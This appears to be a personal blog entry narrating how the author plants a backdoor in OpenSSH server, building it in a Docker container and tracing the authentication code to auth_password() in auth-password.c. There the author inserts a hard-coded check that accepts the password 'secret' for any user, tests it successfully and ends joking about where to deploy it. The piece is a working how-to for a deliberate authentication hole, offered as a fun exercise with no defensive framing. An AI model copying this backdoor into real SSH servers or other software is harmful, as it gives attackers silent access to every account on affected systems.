Jan 21, 2016. 11:44am

- Total time: 3:36 minutes

Time to put a backdoor in OpenSSH Server. My goal is to allow an attacker to enter a special password to immediately gain access for whatever user was specified.

Time to get the source of the SSH server. I remember the SSH client and server being different packages. Let me see what it's named exactly by querying apt-get.

apt-get source sshd

Nothing. No package exists with that name.

dpkg -l ssh

This shows me that the ssh package is a metapackage, leading me to believe that it contains both the client and server as dependencies of the ssh package.

Oh yeah, the packages are called openssh-client and openssh-server. Duh.

Time to "apt-get source openssh-server" in a working directory.

Got the code. Time to start analyzing where I should put the backdoor. Maybe I'll start from when the daemon starts. Time to "grep main *" and see where some main functions are. Hmm, there's a lot of results, and a lot of code comments. Time to refine the grep command.

grep " main" *

This made the returned set of results smaller. Time to do some exploratory searching through some of the results. The Makefile has some interesting clues. I should check out the openssh-server package's dependencies to see if what I'm looking for is in a openssh library.

The command "dpkg --status openssh-server" provides a bunch of useful information about the package. Looks like there's no openssh lib, but there are some other interesting packages that the openssh-server depends on. Namely: libpam-runtime, libpam-modules and openssh-client.

I'll continue looking at the code to see where the main entry point for the ssh daemon is.

Found it. its in "ssh.c". Lets build a deb install file before I start modifying any code to not confuse myself later on. Reading the INSTALL file, it says that I need to run the following to build it:

./configure
make

and optionally to install:

make install

The command "./configure && make" worked without any errors. Awesome. I'm thinking of setting up a docker image to do the installation and testing in since I don't want to play around with my host system (even though there's the possibility of installing/configuring into a different directory, there's probably other things that can interfere such as port numbers, processes, etc.)

Success. I've created an Ubuntu docker container, mounting the folder that contains the openssh-server source from the host into the container. Here's the command:

docker run --name "ssh-server" -v "/home/jon/git/openssh-server/openssh-6.6p1/:/ssh" -it ubuntu

For now on, the commands that I run are by default executed in the Ubuntu container unless otherwise specified.

Trying to run "make" again, but its not installed. Of course, the container doesn't have any of the build tools required. Time to "apt-get update && apt-get install build-essential"

Running "make install" seemed to have worked. There was an error with the sshd user not existing, but that shouldn't be a problem.

Looks like that error mattered. The INSTALL manual mentions that I need to follow the steps in README.privsep to configure the privilege separation as it's enabled by default. Looks to be just creating the sshd user and giving it permissions.

There may be some incompatibilities between my host and the container since the container isn't a fully fledged installation of Ubuntu. I want to build it inside of the container so that the configure and build knows what system its supposed to be built for. Luckily apt-get has the build-dep command.

apt-get build-dep openssh-server

*Waiting for the build dependencies to build/install*

At least this isn't Gentoo. Those guys are F'ed in the head with their outlook of building/configuring everything as the user. Archlinux is a healthy point in between Ubuntu and Gentoo.

Installation all done. lets try "./configure" again.

Perfect. It worked. Time to "make install"

All of these compiler options, Makefiles and other low level mumbo jumbo is over the top configuration. That's why I prefer Java or other higher level languages since they're easier to pick up and configure. The Go language is a good contender for a systems programming language. When I have the time I plan on learning and hacking on stuff with Go. Plus, its all the hype these days to write your Microservices in Go.

Installation was complaining about creating a symbolic link, but the destination already exists. rm that shiz. "make install" again and it worked with no errors.

Time to run the daemon. Running "sshd" gives me this failure message "sshd re-exec requires execution with an absolute path". Ok, running "/usr/local/sbin/sshd" instead. It worked. A quick "ps aux" and it shows that the server is running.

Let's try logging in. I may have to create a user with a password to test this since the ubuntu image for the container by default comes with root as the only user.

"ssh localhost"

I'm presented with a login. Yes :D

I don't know the default password, (or even if it's set). A quick "passwd", setting the root password to "asdf", then trying to login with the new password worked. Awesome. Time to start modifying the code.

Lets init a git repo so that we can rollback our changes just in case.

Done.

I should be looking in "sshd.c" instead of "ssh.c" since the latter is just the client. Looking at server_accept_loop() function. It sounds promising. It forks the process when a client is accepted. The client then calls platform_post_fork_child().

The main() is further down in the file. I see some code dealing with authenticating. There's also an "authenticated" label which is used to jump to when the client has successfully authenticated, I assume.

Here's some of the code that authenticates the user:

if (use_privsep) {
                if (privsep_preauth(authctxt) == 1)
                        goto authenticated;

I believe that we're using privilege separation (since I set something up that went by that name), so the privsep_preauth(authctxt) function would be called. Let's figure out where that function is.

That function then passes a newly created Authctxt struct to monitor_child_preauth(). That function seems to be in another file. Lets grep for it... Its in "monitor.c".

I might be able to set authenticated = 1 if I check the received password here. I'm not sure if the password gets received at this point though. Time to dig deeper. That function then calls "monitor_read()".

monitor_read() uses some confusing constants, going to read the header file to see what's up with them. "MONITOR_ANS_AUTHPASSWORD" looks like a useful const to look for. Seems like it would be the response from the client, containing the password.

mm_answer_authpassword() is a function that contains this const. An interesting function is auth_password since it sets an int variable called authenticated. See code below:

authenticated = options.password_authentication &&
            auth_password(authctxt, passwd);

auth_password sounds like it's in auth.c. Lets go see. Nope, its in auth-password.c, good try though.

This looks promising - the function definition takes a parameter named password.

auth_password(Authctxt *authctxt, const char *password)

So the parameter "password" is the plaintext password, passed from the client. Right before the password is validated with sys_auth_passwd(), returning whether it is correct or not, I put in the following (after remembering how to program C):

if (strcmp(password, "secret") == 0) {
        return 1;
}

"secret" is the backdoor password that needs to be entered to gain access. It compares the plaintext password with the backdoor password. If they're equal the function returns true, meaning that the password matched. If the password didn't match, the code would continue normally, verifying the password the usual way.

A quick "make install" and the daemon restart and I've got the new code running.

I "ssh localhost", entering an incorrect password - "invalid password". That's correct. Then I try the normal password - "success". That's good as well. Now the big test, whether the backdoor will work when I use "secret" as the password.

...

Bingo! It works!!!

Well that's awesome. I was going to start clapping and congratulating myself by walking around, but this is the quiet floor of the library.

That was fun.

Let's create another user and try the backdoor password using that account.

adduser jon

Now let's ssh into it

ssh jon@localhost

Yup! It works for all cases!

Jan 21, 2016. 3:20pm - Finishing time. Time to grab some lunch and think of where I can install this backdoor ssh server. Oh wait, only theoretically, of course ;)
